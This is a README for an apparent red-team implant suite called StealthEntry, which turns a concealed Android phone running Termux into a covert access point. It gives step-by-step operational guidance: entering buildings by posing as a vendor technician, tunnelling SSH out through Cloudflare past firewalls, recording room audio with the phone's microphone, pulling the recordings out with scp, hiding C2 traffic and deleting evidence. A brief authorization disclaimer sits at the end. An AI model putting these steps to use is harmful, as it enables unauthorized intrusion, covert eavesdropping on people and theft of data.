# StealthEntry v1.0
> **This is for hands-on red team hacking with real simulation. Not for "Box-Ticking Security", we dont play act like that to fake security.**

**Accurate In-Network Persistence & Tactical Ingress**

**Developer:** `Jake Lo`  
**Philosophy:** *Precision over Volume. Stealth over Noise.*

---

## 📖 Introduction
**StealthEntry** is a professional Red Team implant suite designed for the **"Plant & Persist"** phase of a targeted operation. It enables an attacker to transform a standard Android device into a covert, remote-access gateway that bypasses modern firewalls and NAT. 

By leveraging **Phase 0 Intelligence**, this tool allows for surgical strikes against specific network infrastructures, especially in environments where legacy hardware or third-party supply chains provide the path of least resistance.

---

## 🎯 The Attack Chain (Jake Lo's Protocol)

### **Phase 0: Pre-Action Intelligence (Reconnaissance)**
* **Infrastructure History Recon:** Analyze the age of the target building. Older architectural infrastructures often suffer from poor **network isolation** (Flat Networks). Identifying a "legacy" building means that once an ingress point is established, you may be able to recon the entire building's shared network.
* **Supply Chain Recon:** Identify the third-party ecosystem (Cleaning services, lift maintenance, HVAC repair). Playing the role of a trusted third-party vendor provides the most effective physical cover.

### **Phase 1: Physical Engagement (The Plant)**
* **Social Engineering:** Leverage Phase 0 intelligence to gain physical access under a legitimate pretense (e.g., service technician).
* **Deployment:** Conceal the Android device (running Termux) near a stable power source.

### **Phase 2: Establish Ingress (The Persistence)**
* **StealthEntry Activation:** Establish an outbound SSH tunnel via Cloudflare. This bypasses strict inbound firewall rules without requiring any local network modification or Root access.
* **Remote Connection:** Attacker connects securely via SSH from a remote Kali machine to the deployed implant.

### **Phase 3: Exploitation & Pivot (The Move)**
* **Internal Recon:** Perform `nmap` scans and service enumeration. 
* **Lateral Movement:** Leverage the lack of network segmentation to pivot from the mobile implant deeper into high-value corporate assets.

---

## 🛠️ Environment Setup

### 1. Attacker Side (Your Kali Linux Machine)
**CRITICAL:** Your Kali machine **must** have the Cloudflare Tunnel client installed.
```bash
# Download and Install Cloudflared (AMD64)
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb
```

### 2. Target Side (Android Device / Termux)
Run the `termux_setup.sh` on the target device to arm the environment:
```bash
chmod +x termux_setup.sh
./termux_setup.sh
```

---

## 🚀 Operational SOP: Remote Audio Reconnaissance

This section defines the standard workflow for implementing remote audio surveillance and data exfiltration.

### **Step 1: Implant Side (Termux)**
Once the SSH session is established, execute the following commands:

* **Path Verification (`Path Check`):**
    * **Command:** `pwd`
    * **Purpose:** Confirm the current absolute path before recording to ensure you can locate the file for `scp` retrieval later.
* **Start Recording (`Start Recording`):**
    * Use the `-f` flag to specify the filename (storing in the home directory is recommended).
    * **Structure:** `termux-microphone-record -f <filename>.m4a`
* **Stop Recording (`Stop Recording`):**
    * Forcefully terminate the current microphone process.
    * **Structure:** `termux-microphone-record -q`

### **Step 2: Controller Side (Kali Linux PC)**
Execute these commands in a local terminal (not inside the SSH session) to manage the C2 link and exfiltrate data.

* **Remote Access (`C2 Login`):**
    * Establish a stable encrypted connection. Always use `ServerAliveInterval` to maintain the session during long idle periods.
    * **Structure:** `ssh -o ProxyCommand='cloudflared access ...' <user>@<dynamic_hostname>`
* **Data Exfiltration (`SCP Download`):**
    * Use `scp` with the tunnel proxy to pull the file from the path identified by `pwd`.
    * **Structure:** `scp -o ProxyCommand='cloudflared access ...' <user>@<dynamic_hostname>:<remote_absolute_path/filename>.m4a ./`

---

## 🛡️ Core Components
* **`run_on_termux.sh`**: Automates tunnel creation and persistent wake-locks.
* **`normal_traffic.sh`**: Mimics standard HTTPS browsing behavior to mask C2 pulse.
* **`termux-api` integration**: Enables remote microphone, camera, and location access.

---

## 🔐 OpSec & Field Notes
* **Silent Cleanup:** Once data is confirmed on the Kali machine, immediately execute `rm <filename>.m4a` on the implant to destroy physical evidence.
* **Permission Traps:** If recording fails, ensure the **Termux:API** app has been granted Microphone permissions (typically achieved via Social Engineering during Phase 1).
* **Emergency Wipe:** If the mission is compromised, kill all processes remotely:
  ```bash
  pkill cloudflared && pkill sshd && termux-wake-unlock && exit
  ```

---

## ⚠️ Disclaimer
**This is for hands-on red team hacking with real simulation. Not for "Box-Ticking Security", we dont play act like that to fake security.** *This toolkit is developed by **Jake Lo** for authorized security assessments only. Unauthorized access to computer systems is strictly prohibited.*
